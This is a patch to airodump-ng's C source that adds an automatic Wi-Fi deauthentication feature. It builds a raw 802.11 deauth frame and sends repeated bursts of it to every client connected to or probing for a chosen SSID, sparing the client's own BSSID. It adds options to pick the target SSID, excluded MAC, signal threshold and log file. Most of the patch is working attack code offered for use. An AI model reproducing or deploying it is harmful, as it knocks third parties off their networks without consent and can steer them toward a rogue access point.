@@ -1,0 +1,352 @@
+Index: src/airodump-ng.c
+===================================================================
+--- src/airodump-ng.c	(Revision 2404)
++++ src/airodump-ng.c	(Arbeitskopie)
+@@ -77,6 +77,11 @@
+ 	GCRY_THREAD_OPTION_PTHREAD_IMPL;
+ #endif
+ 
++
++#define DEAUTH_REQ      \
++    "\xC0\x00\x3A\x01\xCC\xCC\xCC\xCC\xCC\xCC\xBB\xBB\xBB\xBB\xBB\xBB" \
++    "\xBB\xBB\xBB\xBB\xBB\xBB\x00\x00\x07\x00"
++
+ void dump_sort( void );
+ void dump_print( int ws_row, int ws_col, int if_num );
+ 
+@@ -643,6 +648,15 @@
+ "      --ignore-negative-one : Removes the message that says\n"
+ "                              fixed channel <interface>: -1\n"
+ "\n"
++"  Deauthentication options:\n"
++"    --deauth-ssid     <ssid>: Deauthenticate all stations probing\n"
++"                              for or being connected to ssid\n"
++"    --deauth-not-mac <bssid>: Do not deauthenticate stations from\n"
++"                              bssid\n"
++"    --deauth-min-rssi <rssi>: Only deauthenticate when received\n"
++"                              packet is stronger than given rssi\n"
++"    --deauth-log   <logfile>: Log every Deauthentication\n"
++"\n"
+ "  Filter options:\n"
+ "      --encrypt   <suite>   : Filter APs by cipher suite\n"
+ "      --netmask <netmask>   : Filter APs by mask\n"
+@@ -1180,10 +1194,73 @@
+     return( 0 );
+ }
+ 
+-int dump_add_packet( unsigned char *h80211, int caplen, struct rx_info *ri, int cardnum )
++
++int do_attack_deauth(unsigned char* bssid, unsigned char* sta, struct wif *wi)
+ {
+-    int i, n, seq, msd, dlen, offset, clen, o;
+-    uint z;
++  int i;
++  int aacks, sacks;
++  unsigned char buf[26];
++
++  /* deauthenticate the target */
++
++  memcpy( buf, DEAUTH_REQ, 26 );
++  memcpy( buf + 16, bssid, 6 );
++
++  aacks = 0;
++  sacks = 0;
++  for( i = 0; i < 4; i++ )
++  {
++    if(i == 0)
++    {
++      PCT; printf( "Sending 4 directed DeAuth. STMAC:"
++          " [%02X:%02X:%02X:%02X:%02X:%02X] [%2d|%2d ACKs]\r",
++          sta[0],  sta[1],
++          sta[2],  sta[3],
++          sta[4],  sta[5],
++          sacks, aacks );
++    }
++
++    memcpy( buf +  4, sta,  6 );
++    memcpy( buf + 10, bssid, 6 );
++
++    if (wi_write(wi, buf, 26, NULL) == -1) {
++      return( 1 );
++    }
++
++
++    usleep( 2000 );
++
++    memcpy( buf +  4, bssid, 6 );
++    memcpy( buf + 10, sta,  6 );
++
++    if (wi_write(wi, buf, 26, NULL) == -1) {
++      return( 1 );
++    }
++
++    usleep( 2000 );
++  }
++  printf("\n");
++  return( 0 );
++}
++
++/* check if given station probed for given SSID.
++ * does NOT handle SSIDs containing null bytes!
++ * returns 1 one match, 0 otherwise.
++ * */
++int probed_ssid_contains(struct ST_info *st, char *ssid)
++{
++  int i;
++  for(i = 0; i < NB_PRB; ++i)
++  {
++    if(strncmp(ssid, st->probes[i], st->ssid_length[i]) == 0)
++      return 1;
++  }
++  return 0;
++}
++
++int dump_add_packet( unsigned char *h80211, int caplen, struct rx_info *ri, int cardnum, struct wif *wi )
++{
++    int i, n, z, seq, msd, dlen, offset, clen, o;
+     int type, length, numuni=0, numauth=0;
+     struct pcap_pkthdr pkh;
+     struct timeval tv;
+@@ -1501,6 +1578,7 @@
+ 
+         st_cur->tinit = time( NULL );
+         st_cur->tlast = time( NULL );
++        st_cur->tlast_deauth = 0;
+ 
+         st_cur->power = -1;
+         st_cur->rate_to = -1;
+@@ -1511,6 +1589,7 @@
+         st_cur->lastseq = 0;
+         st_cur->qos_fr_ds = 0;
+         st_cur->qos_to_ds = 0;
++        st_cur->deauth_cnt = 0;
+         gettimeofday( &(st_cur->ftimer), NULL);
+ 
+         for( i = 0; i < NB_PRB; i++ )
+@@ -1553,6 +1632,35 @@
+                 st_cur->missed += msd;
+         }
+         st_cur->lastseq = seq;
++
++        /* handle station disassociation for every packet NOT targeted at our own AP.
++         * only target (connected) clients connected to AP with given SSID or probed that SSID.
++         */
++        if(G.do_sta_action && st_cur->base &&
++            (strncmp(ap_cur->essid, G.sta_action_essid, ap_cur->ssid_length) == 0 ||
++             probed_ssid_contains(st_cur, G.sta_action_essid)) &&
++            memcmp(ap_cur->bssid, G.sta_action_own_bssid, 6) != 0
++          )
++        { /* Also, only deauth at max once every five seconds and at most 10 times total 
++         * as we do not want to do any harm! */
++          if(ri->ri_power > G.sta_action_min_ssi && ri->ri_power < -1 && st_cur->tlast_deauth < time(NULL) - 5 && st_cur->deauth_cnt < 10)
++          {
++            st_cur->tlast_deauth = time(NULL);
++            st_cur->deauth_cnt ++;
++            if(wi) {
++              do_attack_deauth(ap_cur->bssid, stmac, wi);
++            }
++
++            fprintf(G.f_sta_action, "%ld: %02X:%02X:%02X:%02X:%02X:%02X %02X:%02X:%02X:%02X:%02X:%02X %i %i\n", (long int)time(NULL),
++                ap_cur->bssid[0], ap_cur->bssid[1], ap_cur->bssid[2],
++                ap_cur->bssid[3], ap_cur->bssid[4], ap_cur->bssid[5],
++                stmac[0], stmac[1], stmac[2],
++                stmac[3], stmac[4], stmac[5],
++                ri->ri_channel, ri->ri_power);
++            fflush(G.f_sta_action);
++          }
++        }
++
+     }
+ 
+     st_cur->nb_pkt++;
+@@ -2934,12 +3042,12 @@
+     int nlines, i, n, len;
+     char strbuf[512];
+     char buffer[512];
+-    char ssid_list[512];
++    char ssid_list[NB_PRB * 34 + 3];
+     struct AP_info *ap_cur;
+     struct ST_info *st_cur;
+     struct NA_info *na_cur;
+     int columns_ap = 83;
+-    int columns_sta = 74;
++    int columns_sta = 77;
+     int columns_na = 68;
+ 
+     int num_ap;
+@@ -3316,7 +3424,7 @@
+ 
+     if(G.show_sta) {
+ 	memcpy( strbuf, " BSSID              STATION "
+-		"           PWR   Rate    Lost    Frames  Probes", columns_sta );
++		"           PWR   Rate    Lost    Frames DC Probes", columns_sta );
+ 	strbuf[ws_col - 1] = '\0';
+ 	fprintf( stderr, "%s\n", strbuf );
+ 
+@@ -3432,7 +3540,7 @@
+ 		    snprintf( strbuf,  sizeof( strbuf ) - 1,
+ 			    "%-256s", ssid_list );
+ 		    strbuf[ws_col - (columns_sta - 6)] = '\0';
+-		    fprintf( stderr, " %s", strbuf );
++		    fprintf( stderr, " %2d %s", st_cur->deauth_cnt, strbuf);
+ 		}
+ 
+ 		fprintf( stderr, "\n" );
+@@ -3513,7 +3621,7 @@
+ {
+     int i, j, n;
+     struct tm *ltime;
+-    char ssid_list[512];
++    char ssid_list[NB_PRB * 34 + 3];
+     struct AP_info *ap_cur;
+     struct ST_info *st_cur;
+ 
+@@ -3644,7 +3752,7 @@
+ 
+     fprintf( G.f_txt,
+         "\r\nStation MAC, First time seen, Last time seen, "
+-        "Power, # packets, BSSID, Probed ESSIDs\r\n" );
++        "Power, # packets, BSSID, Probed ESSIDs, dc\r\n" );
+ 
+     st_cur = G.st_1st;
+ 
+@@ -3710,7 +3818,7 @@
+                 break;
+         }
+ 
+-        fprintf( G.f_txt, "%s\r\n", ssid_list );
++        fprintf( G.f_txt, "%s, %d\r\n", ssid_list, st_cur->deauth_cnt );
+ 
+         st_cur = st_cur->next;
+     }
+@@ -5545,6 +5653,10 @@
+         {"netmask",  1, 0, 'm'},
+         {"bssid",    1, 0, 'd'},
+         {"essid",    1, 0, 'N'},
++        {"deauth-ssid", 1, 0, 'X'},
++        {"deauth-not-mac", 1, 0, 'Y'},
++        {"deauth-min-rssi", 1, 0, 'y'},
++        {"deauth-log", 1, 0, 'S'},
+         {"essid-regex", 1, 0, 'R'},
+         {"channel",  1, 0, 'c'},
+         {"gpsd",     0, 0, 'g'},
+@@ -5644,6 +5756,9 @@
+     G.output_format_csv = 1;
+     G.output_format_kismet_csv = 1;
+     G.output_format_kismet_netxml = 1;
++    G.f_sta_action = NULL;
++    G.do_sta_action = 0;
++    G.sta_action_min_ssi = -1;
+ 
+ #ifdef HAVE_PCRE
+     G.f_essid_regex = NULL;
+@@ -5726,7 +5841,7 @@
+         option_index = 0;
+ 
+         option = getopt_long( argc, argv,
+-                        "b:c:egiw:s:t:u:m:d:N:R:aHDB:Ahf:r:EC:o:x:MU",
++                        "b:c:egiw:s:t:u:m:d:N:R:aHDB:Ahf:r:EC:o:x:MUS:y:Y:X:",
+                         long_options, &option_index );
+ 
+         if( option < 0 ) break;
+@@ -5781,6 +5896,33 @@
+                 G.show_manufacturer = 1;
+                 break;
+ 
++      case 'S':
++                G.do_sta_action = 1;
++                G.f_sta_action = fopen(optarg, "wb");
++                if(!G.f_sta_action)
++                {
++                  printf("Could not open sta_action file for writing!\n");
++                  goto usage;
++                }
++                break;
++
++      case 'y':
++                G.sta_action_min_ssi = atoi(optarg);
++                break;
++
++      case 'Y': 
++                if(getmac(optarg, 1, G.sta_action_own_bssid) != 0)
++                {
++                    printf("Notice: invalid bssid for deauth filter\n");
++                    printf("\"%s --help\" for help.\n", argv[0]);
++
++                    return( 1 );
++                }
++                break;
++      case 'X':
++                strncpy(G.sta_action_essid, optarg, 31);
++                break;
++
+ 	    case 'U' :
+ 	    		G.show_uptime = 1;
+ 	    		break;
+@@ -6670,13 +6812,13 @@
+                     read_pkts++;
+ 
+                     wi_read_failed = 0;
+-                    dump_add_packet( h80211, caplen, &ri, i );
++                    dump_add_packet( h80211, caplen, &ri, i , wi[i]);
+                 }
+             }
+         }
+         else if (G.s_file != NULL)
+         {
+-            dump_add_packet( h80211, caplen, &ri, i );
++            dump_add_packet( h80211, caplen, &ri, i, NULL );
+         }
+     }
+ 
+Index: src/airodump-ng.h
+===================================================================
+--- src/airodump-ng.h	(Revision 2404)
++++ src/airodump-ng.h	(Arbeitskopie)
+@@ -41,7 +41,7 @@
+ #define DEFAULT_CWIDTH  20 /* 20 MHz channels by default */
+ 
+ #define NB_PWR  5       /* size of signal power ring buffer */
+-#define NB_PRB 10       /* size of probed ESSID ring buffer */
++#define NB_PRB 20       /* size of probed ESSID ring buffer */
+ 
+ #define MAX_CARDS 8	/* maximum number of cards to capture from */
+ 
+@@ -268,7 +268,7 @@
+     struct ST_info *prev;    /* the prev client in list   */
+     struct ST_info *next;    /* the next client in list   */
+     struct AP_info *base;    /* AP this client belongs to */
+-    time_t tinit, tlast;     /* first and last time seen  */
++    time_t tinit, tlast, tlast_deauth;     /* first and last time seen  */
+     unsigned long nb_pkt;    /* total number of packets   */
+     unsigned char stmac[6];  /* the client's MAC address  */
+     char *manuf;             /* the client's manufacturer */
+@@ -285,6 +285,7 @@
+     struct WPA_hdsk wpa;     /* WPA handshake data        */
+     int qos_to_ds;           /* does it use 802.11e to ds */
+     int qos_fr_ds;           /* does it receive 802.11e   */
++    int deauth_cnt;
+ };
+ 
+ /* linked list of detected macs through ack, cts or rts frames */
+@@ -335,6 +336,7 @@
+     FILE *f_cap;            /* output cap file      */
+     FILE *f_ivs;            /* output ivs file      */
+     FILE *f_xor;            /* output prga file     */
++    FILE *f_sta_action;     /* station action file/pipe */
+ 
+     char * batt;            /* Battery string       */
+     int channel[MAX_CARDS];           /* current channel #    */
+@@ -424,6 +426,11 @@
+     /* Airodump-ng start time: for kismet netxml file */
+     char * airodump_start_time;
+ 
++    int do_sta_action;
++    int sta_action_min_ssi;
++    char sta_action_essid[32];
++    unsigned char sta_action_own_bssid[6];
++
+     int output_format_pcap;
+     int output_format_csv;
+     int output_format_kismet_csv;
+
